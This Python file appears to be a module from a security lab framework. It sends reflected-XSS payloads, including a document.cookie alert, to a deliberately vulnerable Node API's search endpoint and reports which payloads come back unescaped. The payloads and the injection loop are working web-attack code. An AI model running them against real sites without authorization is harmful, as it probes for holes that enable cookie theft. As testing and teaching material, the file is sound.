"""XSS payload injector.

Sends reflected-XSS payloads to the vulnerable Node API's /api/search endpoint
and checks whether each payload is reflected unescaped in the HTML response.
"""

from __future__ import annotations

import asyncio
import html

import httpx

from .base import AttackModuleBase, Emit, register

PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "\"><svg/onload=alert(1)>",
    "<body onload=alert('xss')>",
]


@register
class Xss(AttackModuleBase):
    id = "xss"
    name = "XSS Payload Injector"
    description = "Injects reflected-XSS payloads and detects unescaped reflection."
    default_target = "vuln-node-api"
    mitre = "T1059.007"
    params_schema = {"port": {"type": "int", "default": 3001, "label": "Target port"}}

    async def run(self, target: str, params: dict, emit: Emit) -> dict:
        port = int(params.get("port", 3001))
        base = f"http://{target}:{port}"
        reflected = []

        await emit("info", f"Targeting {base}/api/search", 5)
        async with httpx.AsyncClient(timeout=10) as client:
            for i, payload in enumerate(PAYLOADS):
                progress = int(10 + (i / len(PAYLOADS)) * 85)
                await emit("info", f"Injecting: {payload}", progress, {"payload": payload})
                try:
                    r = await client.get(f"{base}/api/search", params={"q": payload})
                    body = r.text
                except Exception as exc:
                    await emit("error", f"Request failed: {exc}", progress)
                    continue

                # Vulnerable if the raw payload appears unescaped in the response.
                if payload in body and html.escape(payload) not in body:
                    await emit("success", f"Reflected unescaped -> XSS confirmed!", progress,
                               {"payload": payload})
                    reflected.append(payload)
                else:
                    await emit("info", "Payload was escaped / not reflected.", progress)
                await asyncio.sleep(0.3)

        success = len(reflected) > 0
        await emit("success" if success else "warn",
                   f"XSS complete: {len(reflected)} reflected payload(s).", 100,
                   {"reflected": reflected})
        return {"success": success, "reflected_payloads": reflected,
                "endpoint": f"{base}/api/search"}
